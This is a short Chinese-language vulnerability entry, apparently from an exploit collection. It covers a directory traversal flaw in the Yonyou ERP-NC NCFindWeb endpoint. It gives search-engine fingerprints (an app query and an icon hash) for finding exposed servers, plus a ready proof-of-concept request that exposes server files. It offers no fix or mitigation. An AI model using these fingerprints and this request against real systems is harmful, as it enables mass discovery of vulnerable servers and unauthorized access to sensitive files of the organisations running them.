# 用友 ERP-NC NCFindWeb 目录遍历漏洞

## 漏洞描述

用友 ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息。

## 漏洞影响

```
用友 ERP-NC
```

## 网络测绘

```
app="用友-UFIDA-NC"
# or
icon_hash="1085941792"
```

## 漏洞复现

poc

```plain
/NCFindWeb?service=IPreAlertConfigService&filename=
```

![](https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/20250326113053539.png)



